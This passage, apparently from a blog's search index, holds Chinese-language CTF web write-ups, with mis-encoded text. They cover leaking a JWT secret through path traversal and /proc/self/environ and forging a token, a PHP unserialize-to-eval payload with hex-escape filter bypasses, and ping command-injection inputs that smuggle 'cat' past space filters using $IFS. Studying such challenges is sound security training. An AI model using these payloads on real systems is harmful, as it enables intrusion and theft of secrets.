class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;TEMPLATES_RELOAD&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line">current_time = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">response0 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">response1 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: current_time&#125;</span><br><span class="line">response2 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid request parameters&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == User.username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == User.password:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;Plato&quot;</span> <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == <span class="string">&quot;ideal_state&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;You are not a sage. You cannot enter the ideal state.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;api-docs.json&#x27;</span>, mimetype=<span class="string">&#x27;application/json;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/enterIdealState&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@check</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    flag = os.popen(<span class="string">&quot;/readflag&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = User.token</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">                response = jsonify(response1)</span><br><span class="line">                response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Logout successful!&#x27;</span>&#125;)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/search&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(request.args.get(<span class="string">&#x27;file&#x27;</span>), <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template_string(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(response2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        <span class="variable language_">self</span>.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;password&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="variable language_">self</span>.username, <span class="string">&#x27;password&#x27;</span>: <span class="variable language_">self</span>.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User = MemUser()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°adminçš„ä¿¡æ¯äº† , {â€œusernameâ€:â€adminâ€ , â€œpasswordâ€:â€passwordâ€} å†&#x2F;readflag</p><p>åªè¦ç”¨æˆ·åæ˜¯Plato å¯†ç æ˜¯ideal_state å°±å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯å®ƒæ— æ³•ç™»å½•ï¼Œä¹Ÿæ— æ³•æ³¨å†Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br></pre></td></tr></table></figure><p>è¦ç›®å½•ç©¿é€?a&#x3D;..&#x2F;..&#x2F;..&#x2F;???????</p><img src="11d98589587d850441e418378bf25e39.png" alt="11d98589587d850441e418378bf25e39.png" /><p>ç•™æ„ä¸€ä¸‹é€™ä¸€å¥:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br></pre></td></tr></table></figure><p>é€™ä¸€å¥æ˜¯æŒ‡åœ¨linuxä¸‹çš„&#x2F;proc&#x2F;self&#x2F;environæœ‰æ”¾key , å¯ä»¥åœ¨?file&#x3D; &#x2F;proc&#x2F;self&#x2F;environæ‰¾åˆ°</p><p>æœ€å¾Œåœ¨&#x2F;proc&#x2F;self&#x2F;environ æ‰¾åˆ°äº†KEY</p><img src="5643d3d71c222dfc43591b4449fed24c.png" alt="5643d3d71c222dfc43591b4449fed24c.png" /><p>SECRET_KEY&#x3D;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r</p><p>é€™æ¨£å°±å¯ä»¥jwtå½é€ äº† , </p><img src="1b29cf97eba9760613949894d4a72e3f.png" alt="1b29cf97eba9760613949894d4a72e3f.png" /><p>ç°¡å–®å¯«ä¸€ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;Plato&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;ideal_state&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆtoken</span></span><br><span class="line">token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, SECRET_KEY, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlBsYXRvIiwicGFzc3dvcmQiOiJpZGVhbF9zdGF0ZSJ9.LpctUZCUocsntlZ7kNWh9KsagP4CMcELs_bt1g_4A-M</span><br></pre></td></tr></table></figure><h2 id="29-Maxser-Revenge"><a href="#29-Maxser-Revenge" class="headerlink" title="29.Maxser Revenge"></a>29.Maxser Revenge</h2><p>æ˜¯ä¸€å€‹php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;check.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir=<span class="string">&#x27;notion&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;S);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">æ¥å§ï¼Œæ¹®ç­æé™!</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€å€‹ååºåˆ—åŒ–php </p><p>ä¾†æ‰“é–‹phpstudy ç”Ÿæˆ NSSçš„åƒæ•¸</p><p>ç›®æ¨™æ˜¯eval(system(â€œls &#x2F;â€œ))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">passthru</span>() ;</span><br><span class="line"><span class="variable">$a</span>-&gt;S = <span class="string">&quot;system(&#x27;ls /&#x27;)&quot;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize($a) ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="2ba80e6f30589677a856d9ad50d69064.png" alt="2ba80e6f30589677a856d9ad50d69064.png" /><p>å‘ç°æœ‰æ­£åˆ™ç»•è¿‡â€œ&#x2F;[A-Za-z_$()]+&#x2F;â€ éœ€è¦è¿‡æ»¤å­—æ¯:</p><p>16é€²åˆ¶è½‰æ–‡æœ¬:<br><img src="572046fd972c87d3ee5775239a1d7d79.png" alt="572046fd972c87d3ee5775239a1d7d79.png" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;passthru&quot;:2:&#123;s:1:&quot;S&quot;;s:14:\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x20\x2f\x27\x29;s:3:&quot;dir&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>hexé‚„æ˜¯å­—æ¯ , </p><p>çœ‹äº†çœ‹å…¶ä»–å¸«å‚…çš„wp , passthruå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ , lsä¸­lè½¬16è¿›åˆ¶ä¸è¡Œ å°±ç›´æ¥cat &#x2F;f*</p><p>(&#x2F;å’Œå¯ä»¥ç›´æ¥ç”¨ï¼Œä¸ç”¨è½¬16è¿›åˆ¶)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\70\61\73\73\74\68\72\75\28\27\63\61\74\20/\66*\27\29;</span><br></pre></td></tr></table></figure><img src="a4785abc923a2e43feb01011e377f5d4.png" alt="a4785abc923a2e43feb01011e377f5d4.png" /><p>æ„é€ payload,è®°å¾—s:19:è¦æ”¹ä¸ºS:19:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">passthru</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;S = <span class="string">&quot;passthru(&#x27;cat /f*&#x27;);&quot;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#echo  base64_encode(serialize($a));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;passthru&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>;S:<span class="number">20</span>:<span class="string">&quot;\70\61\73\73\74\68\72\75\28\27\63\61\74\20/\66*\27\29;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;dir&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><img src="25f376dd0b5cc047ca0951ac84059a34.png" alt="25f376dd0b5cc047ca0951ac84059a34.png" /><h2 id="30-Ping-Ping-Ping"><a href="#30-Ping-Ping-Ping" class="headerlink" title="30.Ping Ping Ping"></a>30.Ping Ping Ping</h2><img src="349142a23ffb190571f209f91cd0f173.png" alt="349142a23ffb190571f209f91cd0f173.png" /><img src="ceba1696d51eae85a3820a0d00ef3ab3.png" alt="ceba1696d51eae85a3820a0d00ef3ab3.png" /><p>ç©ºæ ¼å’Œflagè¢«banäº†</p><img src="5ce731b01dcdbd163cf01d3cfd2fff87.png" alt="5ce731b01dcdbd163cf01d3cfd2fff87.png" /><p>symbolè¢«banäº† , </p><p>127.0.0.1|ls</p><img src="d5fbcd5e74f7beb3f974da2202f2b978.png" alt="d5fbcd5e74f7beb3f974da2202f2b978.png" /><p>ç”¨$IFSä»£æ›¿ç©ºæ ¼  </p><p>$9 ä»£æ›¿ &#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat$IFS$9index.php</span><br></pre></td></tr></table></figure><img src="224ce82d74ce207b444dab02cc62293d.png" alt="224ce82d74ce207b444dab02cc62293d.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;q=g;cat$IFS$9fla$q.php</span><br></pre></td></tr></table></figure><img src="42eab3f9433044da14d296dd6bb8f8e3.png" alt="42eab3f9433044da14d296dd6bb8f8e3.png" />]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
